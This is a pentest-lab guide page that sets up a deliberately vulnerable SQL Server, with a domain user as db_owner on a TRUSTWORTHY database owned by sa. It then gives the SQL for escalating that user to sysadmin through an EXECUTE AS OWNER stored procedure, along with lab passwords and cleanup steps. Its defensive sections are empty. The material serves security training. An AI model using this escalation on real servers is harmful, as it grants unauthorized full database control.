# DB-Owner

## Configuring

### Prerequisite

{% content-ref url="../initial-access/normal-domain-user-access.md" %}
[normal-domain-user-access.md](../initial-access/normal-domain-user-access.md)
{% endcontent-ref %}

### Configuring

1. Login to `WEB01` as the `Administrator` user with password `Welcome01!`.
2. Open "Microsoft SQL Server Management Studio"

![](<../../../../.gitbook/assets/image (3) (1).png>)

3\. Login with the `sa` user using the password `sa` or `Password1!` (Depending if you changed it for another vulnerability)

![](<../../../../.gitbook/assets/image (30) (1).png>)

4\. Click “New Query” button and use the SQL query below to make `Amsterdam\Richard` database owner of the `production` database.

![](<../../../../.gitbook/assets/image (10) (1) (2) (1).png>)

```
Use Production;
EXEC sp_addrolemember [db_owner], [AMSTERDAM\Richard];
```

5\. Change the Owner of the database to the SA account. Right click on "Production", click "Properties" and open the "Files" tab. Click on the "..." and fill in "sa" and click on "OK"

![](<../../../../.gitbook/assets/image (2) (1).png>)

6\. Execute the following query to make sure `Amsterdam\Richard` is Database owner and the real Owner of the database is `sa`:

```
select rp.name as database_role, mp.name as database_user
from sys.database_role_members drm
join sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)

SELECT suser_sname(owner_sid) FROM sys.databases WHERE name = 'Production'
```

![](<../../../../.gitbook/assets/image (68) (1) (1).png>)

![](<../../../../.gitbook/assets/image (53) (1).png>)

7\. Set the database as trustworthy and check if it is:

```
ALTER DATABASE MyAppDb SET TRUSTWORTHY ON
```

![](<../../../../.gitbook/assets/image (65) (1) (1).png>)

```
SELECT a.name,b.is_trustworthy_on
FROM master..sysdatabases as a
INNER JOIN sys.databases as b
ON a.name=b.name;
```

![](<../../../../.gitbook/assets/image (39) (1).png>)

The `1` after `Production` shows us that the database is `ThrustWorthy`.

## Attacking

### How it works

If the database is set as trustworthy and we have db\_owner privileges, we could elevate our privileges and execute queries as sa.

### Tools

* [HeidiSql](https://www.heidisql.com/)

### Executing attack

1. Login to `WS01` as Richard with the password `Sample123`.
2. Download and start heidiSQL.
3. Click on "New" on the left bottom and configure the following settings:

* Network Type: `Microsoft SQL Server (TCP/IP)`
* Library: `SQLOLEDB`
* Hostname / IP: `WEB01.amsterdam.bank.local`
* Select: "Use Windows Authentication"
* Port: `1433`

![](<../../../../.gitbook/assets/image (58) (1) (1).png>)

4\. Click "OK" on the security Issue warning.

#### Prerequisites

5\. Click on the "Query" tab and enter the following Query to check if we are `db_owner`:

```
select rp.name as database_role, mp.name as database_user
from sys.database_role_members drm
join sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)
```

![](<../../../../.gitbook/assets/image (66) (1) (1) (1) (1).png>)

Our current user `AMSTERDAM\richard` is db\_owner.

6\. Check who is the owner of the database.

```
SELECT suser_sname(owner_sid), * FROM sys.databases
```

![](<../../../../.gitbook/assets/image (59) (1) (1) (1).png>)

`sa` is the owner of the `production` database.

6\. Check if the database is set to trustworthy

```
SELECT a.name,b.is_trustworthy_on
FROM master..sysdatabases as a
INNER JOIN sys.databases as b
ON a.name=b.name;
```

![](<../../../../.gitbook/assets/image (13) (1) (1).png>)

The Production database is trustworty.

#### Executing the attack

7\. Create a stored procedure which will add `AMSTERDAM\Richard` as sysadmin.

```
USE Production;
CREATE PROCEDURE sp_elevate_me
WITH EXECUTE AS OWNER
AS
EXEC sp_addsrvrolemember 'AMSTERDAM\Richard','sysadmin'
```

![](<../../../../.gitbook/assets/image (57) (1).png>)

8\. Execute the stored procedure:

```
USE Production;
EXEC sp_elevate_me
```

![](<../../../../.gitbook/assets/image (1) (1) (1).png>)

9\. Check if we are sysadmin:

```
SELECT is_srvrolemember('sysadmin')
```

![](<../../../../.gitbook/assets/image (34) (1) (1).png>)

The `1` means that we are sysadmin! Check the executing commands page under SQL Server Attacks to read how to execute cmd commands:

{% content-ref url="../executing-commands.md" %}
[executing-commands.md](../executing-commands.md)
{% endcontent-ref %}

#### Cleanup

1. Login to WEB01 as Administrator, start the "Microsoft SQL Server Management Studio" and login as Administrator.
2. Execute the following query:

```
EXEC sp_dropsrvrolemember 'AMSTERDAM\Richard','sysadmin';
DROP PROCEDURE sp_elevate_me;
```

## Defending

### Recommendations



### Detection



## References

{% embed url="https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases" %}
